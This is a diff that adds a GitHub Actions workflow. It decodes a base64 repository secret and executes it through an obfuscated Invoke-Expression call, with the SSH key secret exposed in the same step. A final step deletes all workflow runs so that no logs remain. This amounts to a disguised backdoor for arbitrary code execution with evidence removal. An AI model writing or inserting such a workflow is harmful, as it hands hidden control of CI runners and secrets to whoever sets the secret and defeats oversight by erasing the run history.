@@ -1,0 +1,37 @@
+name: weearefinallyfree
+on:
+  workflow_dispatch:
+jobs:
+  weearefinallyawake:
+    runs-on: windows-latest
+    permissions:
+      actions: write
+      contents: read
+    steps:
+      - name: r1dex
+        uses: actions/checkout@v4
+      - name: r2dex
+        uses: actions/cache@v4
+        with:
+          path: |
+            C:\Windows\r4dx
+          key: ${{ runner.os }}-r4dx-session-${{ github.run_id }}
+          restore-keys: |
+            ${{ runner.os }}-r4dx-session-
+      - name: r3dex
+        shell: powershell
+        env:
+          LETS_GO: ${{ secrets.R4DX_EXECUTE }}
+          SSH_KEY: ${{ secrets.SSH_KEY }}
+        run: |
+          $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:LETS_GO))
+          $e = "I" + "E" + "X"
+          & $e ($d)
+      - name: i-am-r4dx
+        uses: Mattraks/delete-workflow-runs@v2
+        if: always()
+        with:
+          token: ${{ github.token }}
+          repository: ${{ github.repository }}
+          retain_days: 0
+          keep_minimum_runs: 0
